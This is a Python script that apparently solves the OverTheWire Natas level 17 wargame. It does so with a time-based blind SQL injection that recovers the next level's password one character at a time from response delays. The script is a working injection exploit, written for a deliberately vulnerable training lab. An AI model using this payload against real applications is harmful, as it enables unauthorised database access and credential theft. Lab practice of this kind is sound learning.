import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas17", "****") # add your own password :P
headers = {"Content-Type": "application/x-www-form-urlencoded"}
url = "http://natas17.natas.labs.overthewire.org/"

# Password generator
count = 1
password = ""
max_lenght = 32
valid_characters = string.digits + string.ascii_letters

# While we haven't found the password...
while count <= max_lenght:
    # ... for each valid character (numbers, lowercase and uppercase)
    for c in valid_characters:
        # Our payload
        payload = "natas18\" AND IF(BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\", SLEEP(2), False) -- "
        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
        # We got a hit
        if response.elapsed.total_seconds() > 2:
            print("Found: " + password + c)
            password += c
            count += 1

print("Final password: " + password)
